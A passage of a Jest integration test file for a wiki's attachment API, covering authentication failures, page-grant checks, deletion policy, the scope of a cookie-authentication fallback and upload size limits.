      expect(res.status).toBe(401);
      expect(res.body.error.code).toBe('AUTHENTICATION_REQUIRED');
    });

    it('returns 400 for a malformed id', async () => {
      const res = await request(app).get('/api/attachments/not-an-objectid/meta').set(authHeaders(accessToken));
      expect(res.status).toBe(400);
      expect(res.body.error.code).toBe('INVALID_ATTACHMENT_ID');
    });

    it('returns 404 for a non-existent attachment', async () => {
      const res = await request(app).get('/api/attachments/000000000000000000000000/meta').set(authHeaders(accessToken));
      expect(res.status).toBe(404);
      expect(res.body.error.code).toBe('ATTACHMENT_NOT_FOUND');
    });

    it('returns 404 (not 403) when the caller lacks grant on the owning page', async () => {
      const page = await createPageViaApi(accessToken, `${PATH_PREFIX}meta-private`, '# secret', 4 /* GRANT_OWNER */);
      const id = await uploadTo(page._id);

      const res = await request(app).get(`/api/attachments/${id}/meta`).set(authHeaders(otherAccessToken));
      expect(res.status).toBe(404);
      expect(res.body.error.code).toBe('ATTACHMENT_NOT_FOUND');
    });

    it('returns the attachment metadata for a viewer with grant', async () => {
      const page = await createPageViaApi(accessToken, `${PATH_PREFIX}meta-ok`, '# m');
      const id = await uploadTo(page._id);

      const res = await request(app).get(`/api/attachments/${id}/meta`).set(authHeaders(accessToken));
      expect(res.status).toBe(200);
      expect(res.body._id).toBe(id);
      expect(res.body.page).toBe(page._id);
      expect(res.body.fileFormat).toBe('image/png');
      expect(res.body.originalName).toBe('pixel.png');
      expect(res.body.creator._id).toBe(userId);
      expect(res.body.url).toBe(`/api/attachments/${id}`);
      // `inUse` is a page-scoped flag and is intentionally omitted from the
      // meta projection (a bare-id lookup has no page context).
      expect(res.body.inUse).toBeUndefined();
    });
  });

  describe('DELETE /api/attachments/:id (remove)', () => {
    it('returns 401 without auth', async () => {
      const res = await request(app).delete('/api/attachments/000000000000000000000000');
      expect(res.status).toBe(401);
    });

    it('returns 400 for malformed ids', async () => {
      const res = await request(app).delete('/api/attachments/not-an-objectid').set(authHeaders(accessToken));
      expect(res.status).toBe(400);
      expect(res.body.error.code).toBe('INVALID_ATTACHMENT_ID');
    });

    it('returns 404 for non-existent attachments', async () => {
      const res = await request(app).delete('/api/attachments/000000000000000000000000').set(authHeaders(accessToken));
      expect(res.status).toBe(404);
      expect(res.body.error.code).toBe('ATTACHMENT_NOT_FOUND');
    });

    it('lets the creator delete the attachment (success)', async () => {
      const page = await createPageViaApi(accessToken, `${PATH_PREFIX}delete-creator`, '# d');
      const upload = await request(app)
        .post(`/api/pages/${page._id}/attachments`)
        .set(authHeaders(accessToken))
        .attach('file', pngBuffer, { filename: 'pixel.png', contentType: 'image/png' });
      expect(upload.status).toBe(200);

      const id = upload.body.attachment._id;
      const res = await request(app).delete(`/api/attachments/${id}`).set(authHeaders(accessToken));
      expect(res.status).toBe(200);
      expect(res.body.success).toBe(true);

      const Attachment = crowi.model('Attachment');
      expect(await Attachment.findById(id)).toBeNull();
    });

    it('lets an admin delete an attachment owned by another user', async () => {
      const page = await createPageViaApi(accessToken, `${PATH_PREFIX}delete-admin`, '# da');
      const upload = await request(app)
        .post(`/api/pages/${page._id}/attachments`)
        .set(authHeaders(accessToken))
        .attach('file', pngBuffer, { filename: 'pixel.png', contentType: 'image/png' });
      expect(upload.status).toBe(200);

      const id = upload.body.attachment._id;
      const res = await request(app).delete(`/api/attachments/${id}`).set(authHeaders(adminAccessToken));
      expect(res.status).toBe(200);
      expect(res.body.success).toBe(true);
    });

    it('lets any authenticated user delete an attachment they did not create (wiki policy)', async () => {
      // Wiki policy: deletion is open to any authenticated user who can view
      // the owning page — not restricted to creator / admin / grantedUsers.
      const page = await createPageViaApi(accessToken, `${PATH_PREFIX}delete-anyone`, '# dx');
      const upload = await request(app)
        .post(`/api/pages/${page._id}/attachments`)
        .set(authHeaders(accessToken))
        .attach('file', pngBuffer, { filename: 'pixel.png', contentType: 'image/png' });
      expect(upload.status).toBe(200);

      const id = upload.body.attachment._id;
      const res = await request(app).delete(`/api/attachments/${id}`).set(authHeaders(otherAccessToken));
      expect(res.status).toBe(200);
      expect(res.body.success).toBe(true);

      const Attachment = crowi.model('Attachment');
      expect(await Attachment.findById(id)).toBeNull();
    });

    it('feature-image-derivative-optimization: returns 500 REMOVE_FAILED when original deletion fails — row-delete-first contract unchanged, and derivative cleanup is still attempted', async () => {
      const page = await createPageViaApi(accessToken, `${PATH_PREFIX}delete-original-fails`, '# do');
      const wideJpeg = await createWideJpeg({ r: 1, g: 2, b: 3 });
      const upload = await request(app)
        .post(`/api/pages/${page._id}/attachments`)
        .set(authHeaders(accessToken))
        .attach('file', wideJpeg, { filename: 'wide.jpg', contentType: 'image/jpeg' });
      expect(upload.status).toBe(200);
      const id = upload.body.attachment._id;

      const Attachment = crowi.model('Attachment');
      const stored = await Attachment.findById(id);
      const originalKey = stored?.filePath as string;
      const derivativeKey = stored?.derivatives?.display?.filePath as string;
      expect(derivativeKey).toBeDefined();

      const driver = crowi.getPlugins().active.storage;
      if (!driver) throw new Error('storage driver missing in test env');
      const realDelete = driver.delete.bind(driver);
      const deleteSpy = jest.spyOn(driver, 'delete').mockImplementation(async (key: string) => {
        if (key === originalKey) throw new Error('simulated original delete failure');
        return realDelete(key);
      });

      try {
        const res = await request(app).delete(`/api/attachments/${id}`).set(authHeaders(accessToken));
        expect(res.status).toBe(500);
        expect(res.body.error.code).toBe('REMOVE_FAILED');
      } finally {
        deleteSpy.mockRestore();
      }

      // Row delete happened first regardless of the original storage failure.
      expect(await Attachment.findById(id)).toBeNull();
      // Derivative cleanup was still attempted despite the original delete failing.
      await expect(driver.get(derivativeKey)).rejects.toBeDefined();
    });
  });

  /**
   * feature-auth-cookie-fallback-scope AC-4 — `createAttachmentAuth`
   * accepts the `crowi.accessToken` cookie ONLY on GET/HEAD for the three
   * headerless delivery routes (by-id, by-id `/original`, by-key). Every
   * other `/attachments/*` route (upload / meta / delete / add) and a
   * malformed header on the delivery routes themselves stay header-only,
   * same as `createJwtAuth`.
   */
  describe('feature-auth-cookie-fallback-scope — cookie fallback scope (AC-4)', () => {
    it('GET /api/attachments/:id succeeds with a headerless cookie', async () => {
      const page = await createPageViaApi(accessToken, `${PATH_PREFIX}cookie-by-id-get`, '# c1');
      const upload = await request(app)
        .post(`/api/pages/${page._id}/attachments`)
        .set(authHeaders(accessToken))
        .attach('file', pngBuffer, { filename: 'pixel.png', contentType: 'image/png' });
      expect(upload.status).toBe(200);
      const id = upload.body.attachment._id;

      const res = await request(app).get(`/api/attachments/${id}`).set(cookieHeaders(accessToken)).buffer(true).parse(bufferParser);
      expect(res.status).toBe(200);
      expect((res.body as Buffer).equals(pngBuffer)).toBe(true);
    });

    it('HEAD /api/attachments/:id succeeds with a headerless cookie', async () => {
      const page = await createPageViaApi(accessToken, `${PATH_PREFIX}cookie-by-id-head`, '# c2');
      const upload = await request(app)
        .post(`/api/pages/${page._id}/attachments`)
        .set(authHeaders(accessToken))
        .attach('file', pngBuffer, { filename: 'pixel.png', contentType: 'image/png' });
      expect(upload.status).toBe(200);
      const id = upload.body.attachment._id;

      const res = await request(app).head(`/api/attachments/${id}`).set(cookieHeaders(accessToken));
      expect(res.status).toBe(200);
    });

    it('GET /api/attachments/:id/original succeeds with a headerless cookie', async () => {
      const page = await createPageViaApi(accessToken, `${PATH_PREFIX}cookie-original-get`, '# c3');
      const upload = await request(app)
        .post(`/api/pages/${page._id}/attachments`)
        .set(authHeaders(accessToken))
        .attach('file', pngBuffer, { filename: 'pixel.png', contentType: 'image/png' });
      expect(upload.status).toBe(200);
      const id = upload.body.attachment._id;

      const res = await request(app).get(`/api/attachments/${id}/original`).set(cookieHeaders(accessToken)).buffer(true).parse(bufferParser);
      expect(res.status).toBe(200);
      expect((res.body as Buffer).equals(pngBuffer)).toBe(true);
    });

    it('HEAD /api/attachments/:id/original succeeds with a headerless cookie', async () => {
      const page = await createPageViaApi(accessToken, `${PATH_PREFIX}cookie-original-head`, '# c4');
      const upload = await request(app)
        .post(`/api/pages/${page._id}/attachments`)
        .set(authHeaders(accessToken))
        .attach('file', pngBuffer, { filename: 'pixel.png', contentType: 'image/png' });
      expect(upload.status).toBe(200);
      const id = upload.body.attachment._id;

      const res = await request(app).head(`/api/attachments/${id}/original`).set(cookieHeaders(accessToken));
      expect(res.status).toBe(200);
    });

    it('GET /api/attachments/by-key/:key succeeds with a headerless cookie', async () => {
      const driver = crowi.getPlugins().active.storage;
      if (!driver) throw new Error('storage driver missing in test env');
      const key = `user/${userId}-cookie-by-key-${Date.now()}.png`;
      await driver.put(key, pngBuffer, { contentType: 'image/png' });
      try {
        const res = await request(app)
          .get(`/api/attachments/by-key/${encodeURIComponent(key)}`)
          .set(cookieHeaders(accessToken))
          .buffer(true)
          .parse(bufferParser);
        expect(res.status).toBe(200);
        expect((res.body as Buffer).equals(pngBuffer)).toBe(true);
      } finally {
        await driver.delete(key).catch(() => {});
      }
    });

    it('HEAD /api/attachments/by-key/:key succeeds with a headerless cookie', async () => {
      const driver = crowi.getPlugins().active.storage;
      if (!driver) throw new Error('storage driver missing in test env');
      const key = `user/${userId}-cookie-by-key-head-${Date.now()}.png`;
      await driver.put(key, pngBuffer, { contentType: 'image/png' });
      try {
        const res = await request(app)
          .head(`/api/attachments/by-key/${encodeURIComponent(key)}`)
          .set(cookieHeaders(accessToken));
        expect(res.status).toBe(200);
      } finally {
        await driver.delete(key).catch(() => {});
      }
    });

    it('GET /files/:id redirects to /api/attachments/:id, and the redirect target still accepts a headerless cookie', async () => {
      const page = await createPageViaApi(accessToken, `${PATH_PREFIX}cookie-files-redirect`, '# c5');
      const upload = await request(app)
        .post(`/api/pages/${page._id}/attachments`)
        .set(authHeaders(accessToken))
        .attach('file', pngBuffer, { filename: 'pixel.png', contentType: 'image/png' });
      expect(upload.status).toBe(200);
      const id = upload.body.attachment._id;

      const redirect = await request(app).get(`/files/${id}`);
      expect(redirect.status).toBe(302);
      expect(redirect.headers.location).toBe(`/api/attachments/${id}`);

      const delivered = await request(app).get(redirect.headers.location).set(cookieHeaders(accessToken)).buffer(true).parse(bufferParser);
      expect(delivered.status).toBe(200);
      expect((delivered.body as Buffer).equals(pngBuffer)).toBe(true);
    });

    it('non-delivery /attachments/* routes stay header-only: upload, meta, delete, add all 401 on a headerless cookie', async () => {
      const page = await createPageViaApi(accessToken, `${PATH_PREFIX}cookie-non-delivery`, '# c6');
      const upload = await request(app)
        .post(`/api/pages/${page._id}/attachments`)
        .set(authHeaders(accessToken))
        .attach('file', pngBuffer, { filename: 'pixel.png', contentType: 'image/png' });
      expect(upload.status).toBe(200);
      const id = upload.body.attachment._id;

      const addRes = await request(app)
        .post(`/api/pages/${page._id}/attachments`)
        .set(cookieHeaders(accessToken))
        .attach('file', pngBuffer, { filename: 'pixel2.png', contentType: 'image/png' });
      expect(addRes.status).toBe(401);

      const uploadRes = await request(app)
        .post('/api/attachments/upload')
        .set(cookieHeaders(accessToken))
        .field('pageId', page._id)
        .field('intent', 'paste')
        .attach('file', pngBuffer, { filename: 'pixel3.png', contentType: 'image/png' });
      expect(uploadRes.status).toBe(401);

      const metaRes = await request(app).get(`/api/attachments/${id}/meta`).set(cookieHeaders(accessToken));
      expect(metaRes.status).toBe(401);

      const deleteRes = await request(app).delete(`/api/attachments/${id}`).set(cookieHeaders(accessToken));
      expect(deleteRes.status).toBe(401);

      // The upload-policy route is programmatic-client only (CLI/curl/MCP),
      // so it must NOT be added to the cookie-fallback allowlist either.
      const policyRes = await request(app).get('/api/attachments/upload-policy').set(cookieHeaders(accessToken));
      expect(policyRes.status).toBe(401);
    });

    it('a malformed Authorization header on a delivery route is rejected even with a valid cookie present', async () => {
      const page = await createPageViaApi(accessToken, `${PATH_PREFIX}cookie-malformed-header`, '# c7');
      const upload = await request(app)
        .post(`/api/pages/${page._id}/attachments`)
        .set(authHeaders(accessToken))
        .attach('file', pngBuffer, { filename: 'pixel.png', contentType: 'image/png' });
      expect(upload.status).toBe(200);
      const id = upload.body.attachment._id;

      const res = await request(app).get(`/api/attachments/${id}`).set('Authorization', 'garbage').set(cookieHeaders(accessToken));
      expect(res.status).toBe(401);
    });

    /**
     * NEEDS_WORK round 2 — the broad `/attachments/*` wildcard
     * (`handlers/attachment.ts`) and the by-id literal mount
     * (`handlers/attachment-stream.ts`) both match `GET /attachments/:id`.
     * Before the fix, `attachment-stream.ts` ALSO installed
     * `createAttachmentAuth` on that literal path, so a single incoming
     * request ran credential resolution TWICE (double PAT lookup, double
     * `User.findById`, double `touchLastUsed()`). Assert exactly one
     * `PersonalAccessToken.findActiveByHash` call per request.
     */
    it('runs credential resolution exactly once per request (no double auth across the broad wildcard + by-id literal mount)', async () => {
      const page = await createPageViaApi(accessToken, `${PATH_PREFIX}cookie-single-pass`, '# c8');
      const upload = await request(app)
        .post(`/api/pages/${page._id}/attachments`)
        .set(authHeaders(accessToken))
        .attach('file', pngBuffer, { filename: 'pixel.png', contentType: 'image/png' });
      expect(upload.status).toBe(200);
      const id = upload.body.attachment._id;

      const PersonalAccessToken = crowi.model('PersonalAccessToken');
      const { token, tokenHash } = PersonalAccessToken.generateToken();
      await PersonalAccessToken.create({ tokenHash, userId, name: 'attachment-single-pass-pat', scopes: ['attachments:read'] });

      const spy = jest.spyOn(PersonalAccessToken, 'findActiveByHash');
      try {
        const res = await request(app).get(`/api/attachments/${id}`).set('Authorization', `Bearer ${token}`);
        expect(res.status).toBe(200);
        expect(spy).toHaveBeenCalledTimes(1);
      } finally {
        spy.mockRestore();
      }
    });
  });

  describe('GET /api/attachments/upload-policy', () => {
    it('returns 401 without auth', async () => {
      const res = await request(app).get('/api/attachments/upload-policy');
      expect(res.status).toBe(401);
      expect(res.body.error.code).toBe('AUTHENTICATION_REQUIRED');
    });

    it('AC-1/AC-5: publishes the policy derived from the existing upload constants, with a single maxBytes.attachment (no paste/dnd)', async () => {
      const res = await request(app).get('/api/attachments/upload-policy').set(authHeaders(accessToken));

      expect(res.status).toBe(200);
      expect(res.body.allowedMimeTypes).toEqual(UPLOAD_ALLOWED_MIME);
      expect(res.body.extensionHints).toEqual(UPLOAD_EXT_TO_MIME);
      expect(res.body.maxBytes).toEqual({ attachment: UPLOAD_MAX_BYTES_DEFAULT });
      expect(res.body.profilePicture).toEqual({
        allowedMimeTypes: PROFILE_PICTURE_ALLOWED_MIME,
        maxBytes: PROFILE_PICTURE_MAX_BYTES,
      });
    });
  });

  describe('unified attachment size limit', () => {
    it('AC-13: profile picture limits are unchanged', () => {
      expect(PROFILE_PICTURE_MAX_BYTES).toBe(5 * 1024 * 1024);
    });

    it('AC-1: POST /pages/:pageId/attachments (add) accepts a file exactly at the 50 MB limit — real multipart framing pushes Content-Length past the raw limit, and the precheck must not reject that', async () => {
      const page = await createPageViaApi(accessToken, `${PATH_PREFIX}add-exact-limit`, '# add');
      const exact = Buffer.alloc(UPLOAD_MAX_BYTES_DEFAULT, 0);

      const res = await request(app)
        .post(`/api/pages/${page._id}/attachments`)
        .set(authHeaders(accessToken))
        .attach('file', exact, { filename: 'exact.bin', contentType: 'application/octet-stream' });

      expect(res.status).toBe(200);
    });

    it('AC-1: POST /pages/:pageId/attachments (add) rejects a 1-byte-over-limit upload with 413 (post-parse check catches what the precheck framing allowance lets through)', async () => {
      const page = await createPageViaApi(accessToken, `${PATH_PREFIX}add-too-large`, '# add');
      const oversize = Buffer.alloc(UPLOAD_MAX_BYTES_DEFAULT + 1, 0);

      const res = await request(app)
        .post(`/api/pages/${page._id}/attachments`)
        .set(authHeaders(accessToken))
        .attach('file', oversize, { filename: 'huge.bin', contentType: 'application/octet-stream' });

      expect(res.status).toBe(413);
      expect(res.body.error.code).toBe('FILE_TOO_LARGE');
    });

    it('AC-1/AC-7: the Content-Length precheck runs BEFORE the body is read — the server 413s while only a fraction of the declared body has been sent, proving parseBody()/arrayBuffer() was never invoked', async () => {
      const page = await createPageViaApi(accessToken, `${PATH_PREFIX}add-precheck-no-buffer`, '# add');

      const address = app.address();
      if (address === null || typeof address === 'string') {
        throw new Error('test server is not listening on a TCP port');
      }

      const boundary = 'crowiTestBoundaryNoBuffer';
      const multipartHead = Buffer.from(
        `--${boundary}\r\nContent-Disposition: form-data; name="file"; filename="huge.bin"\r\nContent-Type: application/octet-stream\r\n\r\n`,
      );
      // The declared Content-Length is far larger than what is ever actually
      // written below. If the handler read the body (directly, or via
      // `.openapi()`'s generated multipart validator) BEFORE checking
      // Content-Length, this request would hang waiting for the remaining
      // declared bytes instead of getting a fast 413 — that hang is exactly
      // what this test would time out on if the precheck regressed back into
      // the handler. 1 MiB comfortably clears the precheck's small
      // multipart-framing allowance (so this exercises the precheck, not the
      // post-parse check the previous test already covers).
      const declaredLength = UPLOAD_MAX_BYTES_DEFAULT + 1024 * 1024;

      const response = await new Promise<{ status: number; body: string }>((resolve, reject) => {
        const req = http.request(
          {
            host: '127.0.0.1',
            port: address.port,
            path: `/api/pages/${page._id}/attachments`,
            method: 'POST',
            headers: {
              Authorization: `Bearer ${accessToken}`,
              'Content-Type': `multipart/form-data; boundary=${boundary}`,
              'Content-Length': declaredLength,
            },
          },
          (res) => {
            const chunks: Buffer[] = [];
            res.on('data', (chunk: Buffer) => chunks.push(chunk));
            res.on('end', () => {
              resolve({ status: res.statusCode ?? 0, body: Buffer.concat(chunks).toString('utf8') });
            });
            res.on('error', reject);
          },
        );
        req.on('error', (err) => {
          // The server responding early (413) and closing the connection
          // before this end ever calls `req.end()` can surface as either a
          // reset (ECONNRESET) or a failed write to the now-closed socket
          // (EPIPE) depending on exactly when the close lands relative to
          // `req.write()` — both are the expected side effect of the fast
          // rejection this test asserts, not a failure. Only reject if we
          // have not already resolved via a full response.
          const code = (err as NodeJS.ErrnoException).code;
          if (code !== 'ECONNRESET' && code !== 'EPIPE') reject(err);
        });
        req.write(multipartHead);
        // Deliberately never call `req.end()` — only `multipartHead.length`
        // bytes (far short of `declaredLength`) are ever sent.
      });

      expect(response.status).toBe(413);
      expect(JSON.parse(response.body)).toEqual({
        error: { code: 'FILE_TOO_LARGE', message: expect.stringContaining(String(UPLOAD_MAX_BYTES_DEFAULT)) },
      });
    });

    it('AC-1/AC-7: a request with NO Content-Length header (chunked transfer) is rejected by the precheck itself, not merely by the post-parse check', async () => {
      const page = await createPageViaApi(accessToken, `${PATH_PREFIX}add-chunked-too-large`, '# add');

      // The precheck rejects on the ABSENCE of `Content-Length` alone — it
      // never reads the body — so a small stream proves the same thing a
      // huge one would, without racing the server's early 413 against a
      // still-streaming multi-megabyte client write (which flakes with
      // EPIPE/ECONNRESET on some platforms).
      const res = await request(app)
        .post(`/api/pages/${page._id}/attachments`)
        .set(authHeaders(accessToken))
        .attach('file', unsizedStream(1024), { filename: 'small.bin', contentType: 'application/octet-stream' });

      expect(res.status).toBe(413);
      expect(res.body.error.code).toBe('FILE_TOO_LARGE');
    });

    it('AC-7: a file just over the limit but within the multipart-framing allowance passes the precheck, then the post-parse check still rejects it', async () => {
      const page = await createPageViaApi(accessToken, `${PATH_PREFIX}add-post-parse-too-large`, '# add');

      const res = await request(app)
        .post(`/api/pages/${page._id}/attachments`)
        .set(authHeaders(accessToken))
        .attach('file', Buffer.alloc(UPLOAD_MAX_BYTES_DEFAULT + 1024, 0), { filename: 'just-over.bin', contentType: 'application/octet-stream' });

      expect(res.status).toBe(413);
      expect(res.body.error.code).toBe('FILE_TOO_LARGE');
    });
  });
});
